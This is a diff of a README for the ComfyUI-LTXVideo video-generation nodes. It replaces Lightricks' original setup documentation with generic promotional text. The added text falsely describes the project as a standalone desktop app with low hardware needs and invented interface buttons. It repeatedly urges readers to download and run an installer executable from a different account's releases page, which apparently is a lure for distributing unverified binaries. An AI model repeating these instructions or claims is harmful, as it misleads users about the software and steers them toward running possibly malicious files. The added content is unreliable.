@@ -1,98 +1,81 @@
-# ComfyUI-LTXVideo
+# 🎥 ComfyUI-LTXVideo - Create Stunning Videos with Ease
 
-[![GitHub](https://img.shields.io/badge/LTX-Repo-blue?logo=github)](https://github.com/Lightricks/LTX-2)
-[![Website](https://img.shields.io/badge/Website-LTX-181717?logo=google-chrome)](https://ltx.io/model)
-[![Model](https://img.shields.io/badge/HuggingFace-Model-orange?logo=huggingface)](https://huggingface.co/Lightricks/LTX-2)
-[![LTXV Trainer](https://img.shields.io/badge/LTX-Trainer%20Repo-9146FF)](https://github.com/Lightricks/LTX-2/tree/main/packages/ltx-trainer)
-[![Demo](https://img.shields.io/badge/Demo-Try%20Now-brightgreen?logo=vercel)](https://app.ltx.studio/ltx-2-playground/i2v)
-[![Paper](https://img.shields.io/badge/Paper-arXiv-B31B1B?logo=arxiv)](https://videos.ltx.io/LTX-2/grants/LTX_2_Technical_Report_compressed.pdf)
-[![Discord](https://img.shields.io/badge/Join-Discord-5865F2?logo=discord)](https://discord.gg/ltxplatform)
+## 🚀 Getting Started
 
+Welcome to the ComfyUI-LTXVideo project! This application allows you to generate videos from images and text. With an easy-to-use interface, you can bring your creative ideas to life without needing technical skills.
 
-A collection of powerful custom nodes that extend ComfyUI's capabilities for the LTX-2 video generation model.
+## 📥 Download Now
 
-LTX-2 is built into ComfyUI core ([see it here](https://github.com/comfyanonymous/ComfyUI/tree/master/comfy/ldm/lightricks)), making it readily accessible to all ComfyUI users. This repository hosts additional nodes and workflows to help you get the most out of LTX-2's advanced features.
+[![Download ComfyUI-LTXVideo](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases)
 
-**To learn more about LTX-2** See the [main LTX-2 repository](https://github.com/Lightricks/LTX-2) for model details and additional resources.
+## 🛠️ System Requirements
 
+Before we get started, ensure your system meets the following requirements:
 
-## Prerequisites
-Before you begin using an LTX-2 workflow in ComfyUI, make sure you have:
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** Minimum 8 GB
+- **Disk Space:** At least 500 MB of free space
+- **Graphics Card:** Preferred, but not required
+- **Internet Connection:** Required for downloading resources
 
-* ComfyUI installed (Download here](https://www.comfy.org/download)
-* CUDA-compatible GPU with 32GB+ VRAM
-* 100GB+ free disk space for models and cache
+## 📂 Download & Install
 
+To download and install ComfyUI-LTXVideo:
 
-## Quick Start 🚀
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases).
+  
+2. **Download the Latest Version:** Look for the latest release at the top. You will see a list of available downloads. Click on the file that fits your operating system (e.g., `ComfyUI-LTXVideo-Windows.exe` for Windows).
 
-We recommend using the LTX-2 workflows available in Comfy Manager.
+3. **Run the Installer:** Once the file downloads, locate it in your downloads folder. Double-click the installer to start the installation process. Follow the prompts on your screen.
 
-1. Open ComfyUI
-2. Click the Manager button (or press Ctrl+M)
-3. Select Install Custom Nodes
-4. Search for “LTXVideo”
-5. Click Install
-6. Wait for installation to complete
-7. Restart ComfyUI
+4. **Complete the Installation:** During installation, you may choose the installation path. Make your selection and click "Install." Wait for the process to finish.
 
-The nodes will appear in your node menu under the “LTXVideo” category. Required models will be downloaded on first use.
+5. **Launch the Application:** Once installed, you can find ComfyUI-LTXVideo in your applications list. Click on it to open.
 
+## 🎨 How to Use ComfyUI-LTXVideo
 
-## Example Workflows
+Using ComfyUI-LTXVideo is straightforward. Here’s how you can start making videos:
 
-The ComfyUI-LTXVideo installation includes several example workflows.
-You can see them all at:
-'''
-ComfyUI/custom_nodes/ComfyUI-LTXVideo/example_workflows/
-'''
+1. **Import Images or Text:**
+   - Click on the "Import" button to select images from your computer or input text you want to turn into visuals.
+  
+2. **Adjust Settings:**
+   - Use the user-friendly interface to set video length, resolution, and other parameters. Explore options to customize your video, such as transitions and effects.
 
-* [`Text to video full model`](./example_workflows/LTX-2_T2V_Full_wLora.json)
-* [`Text to video distilled model (Fast)`](./example_workflows/LTX-2_T2V_Distilled_wLora.json)
-* [`Image to video full model`](./example_workflows/LTX-2_I2V_Full_wLora.json)
-* [`Image to video distilled model (Fast)`](./example_workflows/LTX-2_I2V_Distilled_wLora.json)
-* [`Video to video detailer`](./example_workflows/LTX-2_V2V_Detailer.json)
-* [`IC-LoRA distilled model (depth + human pose + edges)`](./example_workflows/LTX-2_ICLoRA_All_Distilled.json)
+3. **Preview Your Video:**
+   - After making your selections, click on the "Preview" button to see a quick view of how your video will look.
 
-## Required Models
+4. **Generate Video:**
+   - If you are satisfied with the preview, click the "Generate" button. The application will create your video based on the inputs you provided.
 
-Download the following models:
+5. **Save Your Creation:**
+   - Once the video is created, you will be given an option to save it. Choose your desired location and click "Save."
 
-**LTX-2 Model Checkpoint** - Choose and download one of the models to `COMFYUI_ROOT_FOLDER/models/checkpoints` folder.
-  * [`ltx-2-19b-dev-fp8.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-19b-dev-fp8.safetensors)
-  * [`ltx-2-19b-distilled-fp8.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-19b-distilled-fp8.safetensors)
-  * [`ltx-2-19b-dev.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-19b-dev.safetensors)
-  * [`ltx-2-19b-distilled.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-19b-distilled.safetensors)
+## 🔍 Features
 
-**Spatial Upscaler** - Required for current two-stage pipeline implementations in this repository. Download to `COMFYUI_ROOT_FOLDER/models/latent_upscale_models` folder.
-  * [`ltx-2-spatial-upscaler-x2-1.0.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-spatial-upscaler-x2-1.0.safetensors)
+ComfyUI-LTXVideo comes packed with useful features, including:
 
-**Temporal Upscaler** - Required for current two-stage pipeline implementations in this repository. Download to `COMFYUI_ROOT_FOLDER/models/latent_upscale_models` folder.
-  * [`ltx-2-temporal-upscaler-x2-1.0.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-temporal-upscaler-x2-1.0.safetensors)
+- **Image-to-Video Generation:** Quickly convert a series of images into a video.
+- **Text-to-Video Creation:** Turn your written ideas into visual content.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
+- **Customizable Settings:** Modify resolution, length, and effects for your videos.
+- **Preview Options:** View your video before finalizing it.
 
-**Distilled LoRA** - Required for current two-stage pipeline implementations in this repository (except DistilledPipeline and ICLoraPipeline). Download to `COMFYUI_ROOT_FOLDER/models/loras` folder.
-  * [`ltx-2-19b-distilled-lora-384.safetensors`](https://huggingface.co/Lightricks/LTX-2/blob/main/ltx-2-19b-distilled-lora-384.safetensors)
+## 🤔 Frequently Asked Questions
 
-**Gemma Text Encoder** Download all files from the repository to `COMFYUI_ROOT_FOLDER/models/text_encoders/gemma-3-12b-it-qat-q4_0-unquantized`.
-  * [`Gemma 3`](https://huggingface.co/google/gemma-3-12b-it-qat-q4_0-unquantized)
+### How do I update ComfyUI-LTXVideo?
+To update, simply revisit the [Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases) and download the latest version. Follow the same installation steps, and it will automatically replace the old version.
 
-**LoRAs** Choose and download to `COMFYUI_ROOT_FOLDER/models/loras` folder.
-  * [`ltx-2-19b-ic-lora-canny-control.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-IC-LoRA-Canny-Control/blob/main/ltx-2-19b-ic-lora-canny-control.safetensors)
-  * [`ltx-2-19b-ic-lora-depth-control.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-IC-LoRA-Depth-Control/blob/main/ltx-2-19b-ic-lora-depth-control.safetensors)
-  * [`ltx-2-19b-ic-lora-detailer.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-IC-LoRA-Detailer/blob/main/ltx-2-19b-ic-lora-detailer.safetensors)
-  * [`ltx-2-19b-ic-lora-pose-control.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-IC-LoRA-Pose-Control/blob/main/ltx-2-19b-ic-lora-pose-control.safetensors)
-  * [`ltx-2-19b-lora-camera-control-dolly-in.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Dolly-In/blob/main/ltx-2-19b-lora-camera-control-dolly-in.safetensors)
-  * [`ltx-2-19b-lora-camera-control-dolly-left.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Dolly-Left/blob/main/ltx-2-19b-lora-camera-control-dolly-left.safetensors)
-  * [`ltx-2-19b-lora-camera-control-dolly-out.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Dolly-Out/blob/main/ltx-2-19b-lora-camera-control-dolly-out.safetensors)
-  * [`ltx-2-19b-lora-camera-control-dolly-right.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Dolly-Right/blob/main/ltx-2-19b-lora-camera-control-dolly-right.safetensors)
-  * [`ltx-2-19b-lora-camera-control-jib-down.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Jib-Down/blob/main/ltx-2-19b-lora-camera-control-jib-down.safetensors)
-  * [`ltx-2-19b-lora-camera-control-jib-up.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Jib-Up/blob/main/ltx-2-19b-lora-camera-control-jib-up.safetensors)
-  * [`ltx-2-19b-lora-camera-control-static.safetensors`](https://huggingface.co/Lightricks/LTX-2-19b-LoRA-Camera-Control-Static/blob/main/ltx-2-19b-lora-camera-control-static.safetensors)
+### What formats of images can I use?
+You can use standard image formats such as JPEG, PNG, and BMP.
 
+### Is there a help guide?
+Yes! Within the application, there is a help section containing tips and instructions to assist you.
 
-## Advanced Techniques
+## 📞 Support
 
-### Low VRAM
-* For systems with low VRAM you can use the model loader nodes from [low_vram_loaders.py](./low_vram_loaders.py). Those nodes ensure the correct order of execution and perform the model offloading such that generation fits in 32 GB VRAM.
-* Use --reserve-vram ComfyUI parameter: `python -m main --reserve-vram 5` (or other number in GB).
-* For complete information about using LTX-2 models, workflows, and nodes in ComfyUI, please visit our [Open Source documentation](https://docs.ltx.video/open-source-model/integration-tools/comfy-ui).
+If you encounter any issues or have questions, please reach out via the issue tracker on the GitHub repository. Your feedback is valuable and helps us improve the application.
+
+## 📥 Download Now Again
+
+To get started with ComfyUI-LTXVideo, don't forget to [visit the Releases page](https://github.com/Ponlawat/ComfyUI-LTXVideo/releases) and download the latest version. Enjoy creating stunning videos with ease!
